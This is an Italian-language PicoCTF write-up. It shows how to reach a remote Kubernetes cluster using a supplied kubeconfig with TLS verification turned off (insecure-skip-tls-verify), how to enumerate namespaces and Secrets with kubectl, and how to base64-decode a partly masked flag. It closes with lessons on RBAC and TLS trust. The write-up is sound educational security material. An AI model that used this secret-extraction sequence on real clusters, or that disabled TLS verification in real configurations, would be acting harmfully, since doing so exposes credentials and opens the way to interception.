# Kubernetes Secrets — PicoCTF Writeup

> **Difficoltà:** Media  
> **Categoria:** Kubernetes, Web Security  
> **Obiettivo:** Accedere a un cluster Kubernetes remoto, enumerare i Secret e recuperare la flag.

---

## 📋 Panoramica

La challenge fornisce un file di configurazione `kubeconfig` per un cluster Kubernetes remoto. L'obiettivo è esplorare le risorse del cluster per trovare un **Secret** contenente la flag. Durante il processo, è necessario gestire problemi di configurazione TLS e navigare tra i diversi namespace del cluster.

---

## 🔍 Fase 1 — Configurazione e Risoluzione TLS

### Il file Kubeconfig

Il file `kubeconfig` fornito contiene le credenziali necessarie (certificati client e chiavi) e l'endpoint del server API di Kubernetes. Inizialmente, l'endpoint punta a `localhost`, ma deve essere aggiornato per riflettere l'indirizzo remoto della challenge: `https://green-hill.picoctf.net:63046`.

### Problema di Verifica del Certificato

Cercando di connettersi al nuovo endpoint, si incontra un errore di verifica TLS:
`tls: failed to verify certificate`. 

Questo accade perché il certificato del server è stato emesso per `localhost` e non per il dominio esterno di PicoCTF. Per procedere in un ambiente di challenge, è necessario bypassare la verifica TLS modificando il file di configurazione:

```yaml
clusters:
- cluster:
    insecure-skip-tls-verify: true
    server: https://green-hill.picoctf.net:63046
```

> ⚠️ **Nota di sicurezza:** L'opzione `insecure-skip-tls-verify: true` disabilita la protezione contro gli attacchi Man-in-the-Middle. È una pratica comune nelle CTF, ma estremamente pericolosa in ambienti di produzione.

---

## 🌐 Fase 2 — Enumerazione del Cluster

### Connessione Iniziale

Una volta configurato l'accesso, verifichiamo la connessione elencando i pod nel namespace di default:

```sh
└─$ kubectl get pods
No resources found in default namespace.
```

La connessione ha successo, ma il namespace di default è vuoto. È necessario esplorare altri namespace.

### Identificazione dei Namespace

Elencando tutti i namespace disponibili:

```sh
└─$ kubectl get namespaces

NAME              STATUS   AGE
default           Active   24h
kube-system       Active   24h
kube-public       Active   24h
kube-node-lease   Active   24h
picoctf           Active   24h
```

Il namespace `picoctf` è chiaramente il nostro obiettivo primario per l'investigazione.

---

## 🔐 Fase 3 — Analisi dei Kubernetes Secrets

### Cosa sono i Secrets?

In Kubernetes, un **Secret** è un oggetto progettato per memorizzare dati sensibili (password, token, chiavi). Tuttavia, per impostazione predefinita, i dati all'interno di un Secret sono semplicemente codificati in **Base64**, non cifrati. Chiunque abbia i permessi RBAC (Role-Based Access Control) per leggere i Secret può visualizzarne il contenuto in chiaro.

### Ricerca del Secret Target

Eseguiamo una ricerca dei Secret all'interno del namespace `picoctf`:

```sh
└─$ kubectl get secrets -n picoctf

NAME                  TYPE                                  DATA   AGE
ctf-secret            Opaque                                1      24h
default-token-xxxxx   kubernetes.io/service-account-token   3      24h
```

Abbiamo identificato `ctf-secret` come il possibile contenitore della flag.

---

## 📄 Fase 4 — Estrazione e Decodifica della Flag

### Lettura del Secret

Utilizziamo il flag `-o yaml` per visualizzare i dettagli completi del Secret, inclusi i dati codificati:

```sh
└─$ kubectl get secret ctf-secret -n picoctf -o yaml

apiVersion: v1
kind: Secret
metadata:
  name: ctf-secret
  namespace: picoctf
data:
  flag: cGljb0NURntrczM**************************
type: Opaque
```

### Decodifica Base64

Il valore della chiave `flag` è codificato in Base64. Utilizziamo la riga di comando per decodificarlo:

```sh
└─$ echo "cGljb0NURntrczM**************************" | base64 -d

picoCTF{ks3**************************}
```

---
## 📊 Riepilogo dell'Attacco

```
[Modifica Kubeconfig: aggiornamento server API]
        ↓
[Bypass TLS: insecure-skip-tls-verify]
        ↓
[Enumerazione Namespace: identificazione 'picoctf']
        ↓
[Enumerazione Secret: scoperta 'ctf-secret']
        ↓
[Estrazione Dati: lettura campo 'flag' in YAML]
        ↓
[Decodifica Base64 → Flag ottenuta]
```

---

## 🛠️ Tool Utilizzati

| Tool      | Scopo                                      |
|-----------|--------------------------------------------|
| `kubectl` | Interazione con il server API di Kubernetes |
| `yaml`    | Formato per la manipolazione del kubeconfig |
| `base64`  | Decodifica dei dati estratti dal Secret    |

---

## 📚 Lezioni Apprese

- **Base64 non è cifratura**: I Kubernetes Secrets sono vulnerabili se l'accesso al server API non è protetto da policy RBAC rigide.
- **RBAC Security**: È fondamentale limitare chi può elencare (`list`) e leggere (`get`) i Secret nei namespace sensibili.
- **TLS Trust**: Bypassare la verifica dei certificati è un rischio che deve essere evitato in scenari reali utilizzando CA (Certificate Authorities) affidabili.